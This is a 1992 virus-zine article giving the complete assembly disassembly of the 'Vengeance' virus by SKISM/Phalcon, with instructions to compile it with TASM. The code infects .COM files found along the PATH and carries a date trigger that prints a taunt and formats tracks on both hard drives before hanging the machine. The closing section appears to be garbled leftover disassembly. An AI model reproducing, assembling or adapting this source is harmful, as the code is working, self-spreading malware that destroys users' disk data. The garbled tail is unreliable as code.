

;ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #1 - YAM '92
;
;Article Title: Vengence Virus Disassembly
;Author: Natas Kaupas


;*****************************************************************************
;    Disassembly of the Vengence Virus (SKISM/Phalcon)
;    Disassembled By Natas Kaupas [YAM]
;
;    Save this and compile this with TASM.
;*****************************************************************************
PAGE  59,132

data_1e           equ     0                       ; (0000:0000=7Ah)
data_6e           equ     100h                    ; (0000:0100=59h)
data_7e           equ     0                       ; (8096:0000=0)
data_8e           equ     2Ch                     ; (8096:002C=0)
data_9e           equ     3Dh                     ; (8096:003D=0)
data_10e  equ     52h                     ; (8096:0052=0)
data_11e  equ     92h                     ; (8096:0092=0)
data_12e  equ     0A8h                    ; (8096:00A8=0)
data_13e  equ     0ACh                    ; (8096:00AC=0)
data_14e  equ     0B0h                    ; (8096:00B0=0)

seg_a             segment byte public
          assume  cs:seg_a, ds:seg_a


          org     100h

veng              proc    far

start:
          jmp     short loc_1             ; (0111)
          db      15 dup (90h)
loc_1:
          push    cx
          mov     dx,327h
          cld                             ; Clear direction
          mov     si,dx
          add     si,3Dh
          mov     di,offset ds:[100h]     ; (8096:0100=0EBh)
          mov     cx,3
          rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
          mov     si,dx
          mov     ax,0FF0Fh
          int     21h                     ; ??INT Non-standard interrupt.
          cmp     ax,101h
          jne     loc_2                   ; Jump if not equal
          jmp     loc_25                  ; (0315)
loc_2:
          push    es
          mov     ah,2Fh                  ; '/'
          int     21h                     ; DOS Services  ah=function 2Fh
                                          ;  get DTA ptr into es:bx
          mov     [si+33h],bx
          nop
          mov     [si+35h],es
          pop     es
          mov     dx,data_11e             ; (8096:0092=0)
          nop
          add     dx,si
          mov     ah,1Ah
          int     21h                     ; DOS Services  ah=function 1Ah
                                          ;  set DTA to ds:dx
          nop
          push    es
          push    si
          mov     es,ds:data_8e           ; (8096:002C=0)
          mov     di,data_1e              ; (0000:0000=7Ah)
loc_3:
          pop     si
          push    si
          add     si,43h
          lodsb                           ; String [si] to al
          mov     cx,8000h
          repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
          mov     cx,4

locloop_4:
          lodsb                           ; String [si] to al
          scasb                           ; Scan es:[di] for al
          jnz     loc_3                   ; Jump if not zero
          loop    locloop_4               ; Loop if cx > 0

          pop     si
          pop     es
          mov     [si+4Eh],di
          mov     di,si
          add     di,52h
          mov     bx,si
          add     si,52h
          mov     di,si
          jmp     short loc_10            ; (01B7)
loc_5:
          cmp     word ptr [si+4Eh],0
          jne     loc_6                   ; Jump if not equal
          jmp     loc_18                  ; (02C2)
loc_6:
          push    ds
          push    si
          mov     ds,es:data_8e           ; (8096:002C=0)
         nop
         mov     di,si
         nop
         mov     si,es:[di+4Eh]
         nop
         add     di,52h
         nop
loc_7:
         nop
         lodsb                           ; String [si] to al
         nop
         cmp     al,3Bh                  ; ';'
         nop
         jz      loc_9                   ; Jump if zero
         nop
         cmp     al,0
         je      loc_8                   ; Jump if equal
         stosb                           ; Store al to es:[di]
         jmp     short loc_7             ; (0197)
loc_8:
         mov     si,data_7e              ; (8096:0000=0)
loc_9:
         pop     bx
         pop     ds
         mov     [bx+4Eh],si
         cmp     ch,5Ch                  ; '\'
         je      loc_10                  ; Jump if equal
         mov     al,5Ch                  ; '\'
         stosb                           ; Store al to es:[di]
loc_10:
         mov     [bx+50h],di
         mov     si,bx
         add     si,48h
         mov     cx,6
         rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
         mov     si,bx
         mov     ah,4Eh                  ; 'N'
         mov     dx,data_10e             ; (8096:0052=0)
         add     dx,si
         mov     cx,3
         int     21h                     ; DOS Services  ah=function 4Eh
                                         ;  find 1st filenam match @ds:dx
         jmp     short loc_12            ; (01D8)
loc_11:
         mov     ah,4Fh                  ; 'O'
         int     21h                     ; DOS Services  ah=function 4Fh
                                         ;  find next filename match
loc_12:
         jnc     loc_13                  ; Jump if carry=0
         jmp     short loc_5             ; (017A)
loc_13:
         mov     ax,ds:data_12e[si]      ; (8096:00A8=0)
         and     al,1Ch
         cmp     al,1Ch
         je      loc_11                  ; Jump if equal
         cmp     word ptr ds:data_13e[si],0F72Dh ; (8096:00AC=0)
         ja      loc_11                  ; Jump if above
         cmp     word ptr ds:data_13e[si],7C8h   ; (8096:00AC=0)
         jb      loc_11                  ; Jump if below
         mov     di,[si+50h]
         push    si
         add     si,data_14e             ; (8096:00B0=0)
loc_14:
         lodsb                           ; String [si] to al
         stosb                           ; Store al to es:[di]
         cmp     al,0
         jne     loc_14                  ; Jump if not equal
         pop     si
         mov     ax,4300h
         mov     dx,data_10e             ; (8096:0052=0)
         add     dx,si
         int     21h                     ; DOS Services  ah=function 43h
                                         ;  get/set file attrb, nam@ds:dx
         mov     [si+3Bh],cx
         mov     ax,4301h
         and     cx,0FFFEh
         mov     dx,data_10e             ; (8096:0052=0)
         add     dx,si
         int     21h                     ; DOS Services  ah=function 43h
                                         ;  get/set file attrb, nam@ds:dx
         mov     ax,3D02h
         mov     dx,data_10e             ; (8096:0052=0)
         add     dx,si
         int     21h                     ; DOS Services  ah=function 3Dh
                                         ;  open file, al=mode,name@ds:dx
         jnc     loc_15                  ; Jump if carry=0
         jmp     loc_17                  ; (02B5)
loc_15:
         mov     bx,ax
         mov     ax,5700h
         int     21h                     ; DOS Services  ah=function 57h
                                         ;  get/set file date & time
         mov     [si+37h],cx
         mov     [si+39h],dx
         mov     ah,2Ch                  ; ','
         int     21h                     ; DOS Services  ah=function 2Ch
                                         ;  get time, cx=hrs/min, dh=sec
         mov     ah,3Fh                  ; '?'
         mov     cx,3
         mov     dx,data_9e              ; (8096:003D=0)
         add     dx,si
         int     21h                     ; DOS Services  ah=function 3Fh
                                         ;  read file, cx=bytes, to ds:dx
         jc      loc_16                  ; Jump if carry Set
         cmp     ax,3
         jne     loc_16                  ; Jump if not equal
         mov     ax,4202h
         mov     cx,0
         mov     dx,0
         int     21h                     ; DOS Services  ah=function 42h
                                         ;  move file ptr, cx,dx=offset
         jc      loc_16                  ; Jump if carry Set
         mov     cx,ax
         sub     ax,3
         mov     [si+41h],ax
         add     cx,316h
         mov     di,si
         sub     di,214h
         mov     [di],cx
         mov     ah,40h                  ; '@'
         mov     cx,2D3h
         mov     dx,si
         sub     dx,216h
         int     21h                     ; DOS Services  ah=function 40h
                                         ;  write file cx=bytes, to ds:dx
         jc      loc_16                  ; Jump if carry Set
         cmp     ax,2D3h
         jne     loc_16                  ; Jump if not equal
         mov     ax,4200h
         mov     cx,0
         mov     dx,0
         int     21h                     ; DOS Services  ah=function 42h
                                         ;  move file ptr, cx,dx=offset
         jc      loc_16                  ; Jump if carry Set
         mov     ah,40h                  ; '@'
         mov     cx,3
         mov     dx,si
         add     dx,40h
         int     21h                     ; DOS Services  ah=function 40h
                                         ;  write file cx=bytes, to ds:dx
loc_16:
         mov     dx,[si+39h]
         mov     cx,[si+37h]
         and     cx,0FFE0h
         or      cx,1Ch
         mov     ax,5701h
         int     21h                     ; DOS Services  ah=function 57h
                                         ;  get/set file date & time
         mov     ah,3Eh                  ; '>'
         int     21h                     ; DOS Services  ah=function 3Eh
                                         ;  close file, bx=file handle
loc_17:
         mov     ax,4301h
         mov     cx,[si+3Bh]
         mov     dx,data_10e             ; (8096:0052=0)
         add     dx,si
         int     21h                     ; DOS Services  ah=function 43h
                                         ;  get/set file attrb, nam@ds:dx
loc_18:
         push    ds
         mov     ah,1Ah
         mov     dx,[si+33h]
         mov     ds,[si+35h]
         int     21h                     ; DOS Services  ah=function 1Ah
                                         ;  set DTA to ds:dx
         pop     ds
         mov     ah,2Ah                  ; '*'
         int     21h                     ; DOS Services  ah=function 2Ah
                                         ;  get date, cx=year, dx=mon/day
         cmp     dl,14h
         jne     loc_25                  ; Jump if not equal
         mov     ah,9
         mov     dx,si
         add     dx,0
         int     21h                     ; DOS Services  ah=function 09h
                                         ;  display char string at ds:dx
         mov     dx,80h
loc_19:
         xor     ch,ch                   ; Zero register
loc_20:
         mov     ah,5
         int     13h                     ; Disk  dl=drive 0  ah=func 05h
                                         ;  format track=ch or cylindr=cx
         cmp     dh,1
         je      loc_21                  ; Jump if equal
         inc     dh
         jmp     short loc_20            ; (02E5)
loc_21:
         cmp     ch,20h                  ; ' '
         je      loc_22                  ; Jump if equal
         xor     dh,dh                   ; Zero register
         inc     ch
         jmp     short loc_20            ; (02E5)
loc_22:
         cmp     dl,81h
         je      loc_23                  ; Jump if equal
         mov     dl,81h
         xor     dh,dh                   ; Zero register
         jmp     short loc_19            ; (02E3)
loc_23:
         mov     ax,2509h
         int     21h                     ; DOS Services  ah=function 25h
                                         ;  set intrpt vector al to ds:dx
loc_24:
         mov     ah,2
         mov     dl,7
         int     21h                     ; DOS Services  ah=function 02h
                                         ;  display char dl
         jmp     short loc_24            ; (030D)
loc_25:
         pop     cx
         xor     ax,ax                   ; Zero register
         xor     bx,bx                   ; Zero register
         xor     dx,dx                   ; Zero register
         xor     si,si                   ; Zero register
         mov     di,100h
         push    di
         xor     di,di                   ; Zero register
         retn    0FFFFh
         db      0Dh, 0Ah, '*** Vengeance is ours!'
         db      ' ***', 0Dh, 0Ah, '$'
         db      ' SKISM/Phalcon ', 27h, '92 $'
         db      10 dup (0)
         db      0CDh, 20h, 90h,0E9h, 00h, 00h
         db      'PATH=*.COM'
         db      0, 0, 0, 0, 0
data_21          db      0
         db      106 dup (0)
         db       44h, 0Eh, 0Bh,0C0h, 7Eh, 0Ah
         db      0FFh, 74h, 10h, 56h,0E8h, 76h
         db       32h, 83h,0C4h, 04h
         db      0E8h, 7Ch, 6Eh,0E8h, 3Ch, 69h
         db      0F6h, 46h,0F0h, 04h, 74h, 03h
         db      0E8h,0BEh, 82h
loc_28:
         test    byte ptr [bp-10h],2
         jz      loc_29                  ; Jump if zero
         call    $+7FBBh
loc_29:
         mov     ax,si
         pop     si
         mov     sp,bp
         pop     bp
         retn
         push    bp
         mov     bp,sp
         sub     sp,1Ah
         push    si
         mov     word ptr [bp-18h],0
         mov     word ptr [bp-0Ah],0
         mov     word ptr [bp-14h],0
         mov     word ptr [bp-6],0
         mov     word ptr [bp-0Eh],0
         mov     word ptr [bp-16h],0
         mov     word ptr [bp-2],0
         mov     word ptr [bp-12h],8CFDh
         esc     3,[bp+di-7Dh]           ; coprocessor escape
         retn
         sub     ax,0DA03h
         mov     bp,cs
         mov     ax,dx
         and     ah,0Fh
         mov     cl,4
         mov     si,dx
         shl     si,cl                   ; Shift w/zeros fill
         mov     cx,si
         shr     cx,1                    ; Shift w/zeros fill
         dec     si
         dec     si
         mov     di,si
         sub     bp,ax
         sub     bx,ax
         mov     es,bp
         mov     ds,bx
         rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
         cld                             ; Clear direction
         mov     ds,bp
         pop     es
         push    es
         mov     di,data_6e              ; (0000:0100=59h)
         xor     si,si                   ; Zero register
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dx,10h
         jmp     short loc_35            ; (04A5)
         db      90h
loc_30:
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jmp     short loc_37            ; (04B5)
loc_31:
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jmp     short loc_38            ; (04BC)
loc_32:
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jmp     short loc_39            ; (04C7)
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
;*               jmp     short loc_42            ;*(04EF)
         db      0EBh, 5Dh
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jmp     short $+60h
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jmp     short $+61h
loc_33:
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
         jc      loc_36                  ; Jump if carry Set
loc_34:
         movsb                           ; Mov [si] to es:[di]
loc_35:
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jz      loc_33                  ; Jump if zero
         jnc     loc_34                  ; Jump if carry=0
loc_36:
         xor     cx,cx                   ; Zero register
         xor     bx,bx                   ; Zero register
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jz      loc_30                  ; Jump if zero
loc_37:
         rcl     bx,1                    ; Rotate thru carry
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jz      loc_31                  ; Jump if zero
loc_38:
         rcl     bx,1                    ; Rotate thru carry
         test    bx,bx
         jz      loc_41                  ; Jump if zero
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jz      loc_32                  ; Jump if zero
loc_39:
         rcl     bx,1                    ; Rotate thru carry
         cmp     bl,6
         jb      loc_41                  ; Jump if below
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jnz     loc_40                  ; Jump if not zero
         lodsw                           ; String [si] to ax
         xchg    ax,bp
         mov     dl,10h
loc_40:
         rcl     bx,1                    ; Rotate thru carry
loc_41:
         mov     cl,byte ptr cs:[15Eh][bx]       ; (8096:015E=0B9h)
         cmp     cl,0Ah
         je      $+76h                   ; Jump if equal

veng             endp

seg_a            ends


         end     start



